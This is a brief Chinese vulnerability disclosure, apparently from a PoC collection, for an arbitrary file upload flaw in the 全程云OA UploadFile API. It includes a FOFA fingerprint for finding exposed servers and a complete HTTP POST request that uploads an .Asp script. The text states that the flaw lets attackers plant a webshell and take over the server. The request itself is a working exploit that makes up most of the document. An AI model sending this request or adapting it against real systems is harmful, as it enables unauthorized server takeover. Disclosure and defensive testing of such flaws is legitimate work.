# 全程云OA接口UploadFile存在任意文件上传漏洞

全程云OA接口UploadFile存在任意文件上传漏洞。该漏洞允许攻击者上传webshell木马获取服务器权限。

## fofa

```java
body="images/yipeoplehover.png"
```

## poc

```java
POST /OA/api/2.0/Common/AttachFile/UploadFile HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR
Content-Length: 191

------WebKitFormBoundaryNe8DcVuv1vEUWDaR
Content-Disposition: form-data; name="upload";filename="123.Asp"

<% response.write("hello,world") %>
------WebKitFormBoundaryNe8DcVuv1vEUWDaR--
```



## 漏洞来源

- https://mp.weixin.qq.com/s/T4kFVsKphUd6OYRYMyMUtg